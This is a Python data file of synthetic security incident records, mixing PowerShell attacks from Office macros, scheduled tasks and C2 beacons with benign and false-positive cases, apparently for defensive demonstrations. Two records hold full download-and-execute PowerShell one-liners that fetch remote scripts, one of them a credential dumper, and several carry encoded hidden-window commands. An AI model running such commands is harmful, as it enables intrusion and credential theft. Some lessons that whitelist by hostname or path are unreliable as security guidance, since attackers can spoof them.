"""
Synthetic Security Incident Dataset for Sentinel Memory
All data is strictly synthetic and intended for defensive cybersecurity demonstrations.
"""

SYNTHETIC_INCIDENTS = [
    {
        "incident_id": "INC-0037",
        "title": "Malicious Word Document Spawning Encoded PowerShell",
        "severity": "HIGH",
        "category": "Malware Execution",
        "timestamp": "2026-08-14T09:12:00Z",
        "host": "WORKSTATION-CORP-42",
        "user": "SYNTH_USER_ALICE",
        "process": "powershell.exe",
        "parent_process": "winword.exe",
        "command": "powershell.exe -ExecutionPolicy Bypass -NoProfile -enc SQBFAFgA...",
        "destination": "198.51.100.23:443",
        "outcome": "Confirmed True Positive - Endpoint isolated, user credentials rotated, persistence scheduled task removed",
        "content": (
            "INCIDENT REPORT INC-0037:\n"
            "Summary: Employee opened a phishing email attachment named 'Q3_Bonus_Summary.docm'. "
            "Microsoft Word (winword.exe) executed an embedded VBA macro that spawned powershell.exe with an encoded payload. "
            "The PowerShell process contacted external IP 198.51.100.23 over port 443 and attempted LSASS memory injection for credential theft.\n"
            "SOC Action Taken: Host WORKSTATION-CORP-42 was immediately quarantined from the internal LAN. "
            "Active sessions terminated and password reset enforced. The malicious macro hash was blacklisted on enterprise EDR.\n"
            "Lesson Learned: Any Word document spawning PowerShell with encoded commands should be treated as high-priority malicious credential harvesting."
        ),
        "tags": ["incident", "word_powershell", "encoded_command", "credential_theft", "phishing", "true_positive"]
    },
    {
        "incident_id": "INC-0052",
        "title": "Scheduled Enterprise Backup Automation False Positive",
        "severity": "LOW",
        "category": "False Positive",
        "timestamp": "2026-08-19T02:00:00Z",
        "host": "BACKUP-SRV-01",
        "user": "CORP_SVC_BACKUP",
        "process": "powershell.exe",
        "parent_process": "winword.exe",
        "command": "powershell.exe -ExecutionPolicy RemoteSigned -File C:\\EnterpriseBackup\\scripts\\doc_archiver.ps1",
        "destination": "10.14.20.5:445",
        "outcome": "False Positive - Verified legitimate administrative archiving routine by IT Engineering",
        "content": (
            "INCIDENT REPORT INC-0052 (FALSE POSITIVE DETERMINATION):\n"
            "Summary: Security alert triggered when winword.exe invoked powershell.exe on BACKUP-SRV-01. "
            "Upon SOC Tier-2 investigation, this was found to be the approved corporate document archiving tool "
            "running scheduled nightly maintenance via doc_archiver.ps1.\n"
            "SOC Action Taken: Alert marked as FALSE POSITIVE. Added SHA-256 hash of doc_archiver.ps1 and service account "
            "CORP_SVC_BACKUP to known enterprise automation exclusions.\n"
            "Lesson Learned: When PowerShell executes under approved service accounts referencing 'doc_archiver.ps1' or 'EnterpriseBackup' "
            "paths, do not quarantine host; verify script integrity against change control repository first."
        ),
        "tags": ["incident", "word_powershell", "backup", "false_positive", "legitimate", "administrative"]
    },
    {
        "incident_id": "INC-0081",
        "title": "Word Document Macro Establishing External Persistence",
        "severity": "HIGH",
        "category": "Command & Control",
        "timestamp": "2026-08-27T14:45:00Z",
        "host": "FINANCE-PC-09",
        "user": "SYNTH_USER_BOB",
        "process": "powershell.exe",
        "parent_process": "winword.exe",
        "command": "powershell.exe -w hidden -enc JABjAGwAaQBlAG4AdAA...",
        "destination": "203.0.113.88:8443",
        "outcome": "Confirmed True Positive - Endpoint isolated, C2 beacon halted, registry run keys cleansed",
        "content": (
            "INCIDENT REPORT INC-0081:\n"
            "Summary: Finance department user on FINANCE-PC-09 opened an untrusted invoice attachment. "
            "winword.exe launched hidden PowerShell (-w hidden) that created a persistent registry Run key in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run. "
            "The process communicated beacon telemetry to 203.0.113.88 on port 8443.\n"
            "SOC Action Taken: Endpoint FINANCE-PC-09 isolated via EDR API within 4 minutes. Registry persistence keys removed. "
            "Perimeter firewall rule deployed blocking 203.0.113.88.\n"
            "Lesson Learned: Hidden PowerShell windows spawned by Microsoft Office applications with port 8443 outbound are high-confidence C2 beacons."
        ),
        "tags": ["incident", "word_powershell", "persistence", "c2", "registry", "true_positive"]
    },
    {
        "incident_id": "INC-0094",
        "title": "Suspicious Scheduled Task PowerShell Execution",
        "severity": "HIGH",
        "category": "Persistence",
        "timestamp": "2026-09-02T11:20:00Z",
        "host": "HR-WORKSTATION-12",
        "user": "SYSTEM",
        "process": "powershell.exe",
        "parent_process": "taskeng.exe",
        "command": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.77/update.ps1')",
        "destination": "192.0.2.77:80",
        "outcome": "Confirmed True Positive - Compromised endpoint remediated, scheduled task purged",
        "content": (
            "INCIDENT REPORT INC-0094:\n"
            "Summary: Windows Task Scheduler (taskeng.exe) initiated a rogue scheduled task named 'WindowsHealthCheck' "
            "running hidden PowerShell that downloaded an external second-stage payload from 192.0.2.77.\n"
            "SOC Action Taken: Malicious scheduled task removed. Endpoint HR-WORKSTATION-12 reimaged. Active Directory account audited.\n"
            "Lesson Learned: Scheduled tasks downloading remote scripts via WebClient.DownloadString represent active compromise."
        ),
        "tags": ["incident", "powershell", "scheduled_task", "downloadstring", "persistence", "true_positive"]
    },
    {
        "incident_id": "INC-0102",
        "title": "Authorized Internal Red Team Security Testing",
        "severity": "LOW",
        "category": "False Positive",
        "timestamp": "2026-09-07T16:00:00Z",
        "host": "SEC-AUDIT-LAPTOP",
        "user": "CORP_SECTEST_ENG",
        "process": "powershell.exe",
        "parent_process": "cmd.exe",
        "command": "powershell.exe -enc VwByAGkAdABlAC0ASABvAHMAdAAgACIAVABlAHMAdAAiAA== -testrun",
        "destination": "10.0.0.99:8080",
        "outcome": "False Positive - Authorized internal adversary simulation exercise verified with Red Team lead",
        "content": (
            "INCIDENT REPORT INC-0102 (FALSE POSITIVE):\n"
            "Summary: Encoded PowerShell alert flagged during internal security audit simulation. "
            "Host SEC-AUDIT-LAPTOP was registered for the authorized September Red Team readiness assessment.\n"
            "SOC Action Taken: Correlated alert against Active Change Authorization Ticket #CHG-99214. Alert closed as Authorized Testing.\n"
            "Lesson Learned: Check host names containing 'SEC-AUDIT' against change authorization calendar before triggering incident escalation."
        ),
        "tags": ["incident", "powershell", "red_team", "false_positive", "authorized_testing"]
    },
    {
        "incident_id": "INC-0118",
        "title": "Excel Macro Spawning PowerShell Credential Harvester",
        "severity": "CRITICAL",
        "category": "Credential Theft",
        "timestamp": "2026-09-12T13:15:00Z",
        "host": "EXEC-LAPTOP-03",
        "user": "SYNTH_USER_CAROL",
        "process": "powershell.exe",
        "parent_process": "excel.exe",
        "command": "powershell.exe -ExecutionPolicy Bypass -C [System.Net.ServicePointManager]::SecurityProtocol = 3072; iex ((New-Object Net.WebClient).DownloadString('http://198.51.100.104/dump.ps1'))",
        "destination": "198.51.100.104:80",
        "outcome": "Confirmed True Positive - Critical credential access intercepted, host isolated within 2 minutes",
        "content": (
            "INCIDENT REPORT INC-0118:\n"
            "Summary: Malicious spreadsheet opened on executive endpoint EXEC-LAPTOP-03. "
            "excel.exe invoked PowerShell to execute in-memory credential dumper dump.ps1.\n"
            "SOC Action Taken: Immediate network isolation. Enterprise-wide search for IOC 198.51.100.104. "
            "Kerberos Golden Ticket invalidation executed as precautionary measure.\n"
            "Lesson Learned: Office applications downloading raw .ps1 files from public IPs require immediate automated isolation."
        ),
        "tags": ["incident", "excel_powershell", "credential_theft", "critical", "true_positive"]
    },
    {
        "incident_id": "INC-0131",
        "title": "IT Systems Health Monitoring Script Routine",
        "severity": "INFORMATIONAL",
        "category": "Benign Automation",
        "timestamp": "2026-09-18T04:30:00Z",
        "host": "ENG-SRV-04",
        "user": "CORP_SVC_MONITOR",
        "process": "powershell.exe",
        "parent_process": "services.exe",
        "command": "powershell.exe -File C:\\EnterpriseMonitoring\\bin\\CheckDiskSpace.ps1 -Threshold 90",
        "destination": "None",
        "outcome": "Benign - Standard infrastructure health monitoring routine",
        "content": (
            "INCIDENT REPORT INC-0131:\n"
            "Summary: Windows service launched PowerShell script CheckDiskSpace.ps1 on production server ENG-SRV-04. "
            "No network connections or obfuscated strings observed.\n"
            "SOC Action Taken: Confirmed signed script from corporate IT repository. Whitelisted in EDR ruleset.\n"
            "Lesson Learned: Plaintext scripts executing from C:\\EnterpriseMonitoring\\bin\\ with valid digital signatures are benign."
        ),
        "tags": ["incident", "powershell", "monitoring", "benign", "automation"]
    },
    {
        "incident_id": "INC-0147",
        "title": "PowerShell Cobalt Strike Beacon Over HTTPS",
        "severity": "CRITICAL",
        "category": "C2 Communication",
        "timestamp": "2026-09-22T21:05:00Z",
        "host": "FINANCE-PC-14",
        "user": "SYNTH_USER_DAVE",
        "process": "powershell.exe",
        "parent_process": "explorer.exe",
        "command": "powershell.exe -nop -w hidden -e aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAA...",
        "destination": "203.0.113.199:443",
        "outcome": "Confirmed True Positive - Active Cobalt Strike C2 severed, endpoint re-imaged, forensics conducted",
        "content": (
            "INCIDENT REPORT INC-0147:\n"
            "Summary: Interactive user session launched obfuscated PowerShell beacon communicating with known bulletproof hosting IP 203.0.113.199 over SSL. "
            "Memory analysis revealed Cobalt Strike malleable C2 profile.\n"
            "SOC Action Taken: Host quarantined, gateway firewall blocked /24 subnet, Incident Response team engaged for forensic triage.\n"
            "Lesson Learned: Encoded PowerShell connecting to non-reputable IPs on 443 with beaconing intervals matches known threat actor playbooks."
        ),
        "tags": ["incident", "powershell", "c2", "cobalt_strike", "critical", "true_positive"]
    },
    {
        "incident_id": "INC-0163",
        "title": "PowerShell Invoked by Word for Approved Document Generation Tool",
        "severity": "LOW",
        "category": "Analyst Feedback / False Positive",
        "timestamp": "2026-09-25T11:10:00Z",
        "host": "FINANCE-PC-17",
        "user": "CORP_FIN_ANALYST",
        "process": "powershell.exe",
        "parent_process": "winword.exe",
        "command": "powershell.exe -ExecutionPolicy Bypass -Command & { [EnterpriseDocGen.Tool]::SyncTemplate('finance_q3') }",
        "destination": "10.20.30.40:443",
        "outcome": "False Positive - Confirmed enterprise finance add-in doc generation by Lead Analyst",
        "content": (
            "INCIDENT REPORT INC-0163 (ANALYST VERDICT FEEDBACK):\n"
            "Summary: Finance endpoint FINANCE-PC-17 triggered alert when winword.exe spawned PowerShell to synchronize document templates. "
            "Analyst evaluated process hierarchy and confirmed destination was internal corporate fileserver 10.20.30.40.\n"
            "Analyst Feedback: 'This was an approved quarterly template refresh routine from our finance add-in EnterpriseDocGen. "
            "Command references EnterpriseDocGen.Tool namespace and connects exclusively to internal 10.20.30.40.'\n"
            "Lesson Learned: Future alerts on FINANCE-PC-* where winword.exe calls EnterpriseDocGen against internal subnets are false positives."
        ),
        "tags": ["incident", "word_powershell", "finance_addin", "false_positive", "analyst_feedback"]
    }
]
